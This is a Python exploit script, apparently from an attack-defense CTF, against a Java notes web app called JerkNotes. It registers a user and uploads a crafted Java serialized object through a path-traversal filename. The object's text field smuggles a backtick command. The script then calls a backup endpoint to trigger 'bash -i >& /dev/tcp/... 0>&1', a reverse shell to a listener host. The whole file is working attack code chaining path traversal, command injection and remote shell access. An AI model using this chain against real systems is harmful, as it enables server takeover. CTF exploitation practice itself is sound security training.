import requests
import random
from checklib import *
from bs4 import BeautifulSoup

IP = "10.99.99.12"
BASE_APP = f"http://{IP}:31338"
JURY_IP = "10.99.201.6"

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def gen_pld(pld):
    pld += '`'
    if len(pld) != 78:
        pad_cnt = 78 - len(pld)
        
        pld += 'A'*pad_cnt
    return b'\xac\xed\x00\x05sr\x00\x1bcr4.sh.JerkNotes.model.Note\xb6\xc5Rw\xfa\x12\x9f\x1f\x02\x00\x04L\x00\x08filePatht\x00\x12Ljava/lang/String;L\x00\x06noteIdt\x00\x10Ljava/util/UUID;L\x00\x04textq\x00~\x00\x01L\x00\x05titleq\x00~\x00\x01xpt\x00O`'+pld.encode()+b'sr\x00\x0ejava.util.UUID\xbc\x99\x03\xf7\x98m\x85/\x02\x00\x02J\x00\x0cleastSigBitsJ\x00\x0bmostSigBitsxp\xa6\x1b\xb2\xd6\x97\xee\xc1\x07\xcb\xcb#`ILL6t\x00\x07contentt\x00\x05title'

def reg(email, password):

    app_sess = requests.Session()

    burp0_url = f"{BASE_APP}/auth/register"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://localhost:31338", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:31338/auth/register", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"username": email, "password": password, "confirm-password": password}
    app_sess.post(burp0_url, headers=burp0_headers, data=burp0_data)

    return app_sess



def attack(sess: requests.Session):
    resp = sess.get(f"{BASE_APP}/profile")
    soup = BeautifulSoup(resp.text, 'html.parser')
    uid = soup.find_all('p', class_="mb-0")[1].text
    # sess.proxies.update(proxies)
    pld = gen_pld("bash -i >& /dev/tcp/10.99.99.12/9323 0>&1")
    sess.post(f"{BASE_APP}/api/files/upload", files={
        'file':(f"../../../../../../app/notes/{uid}/{uid}",pld)
    })

    sess.post(f"{BASE_APP}/api/notes/backup", timeout=10)


u, p = rnd_username(), rnd_password()
s = reg(u, p)
attack(s)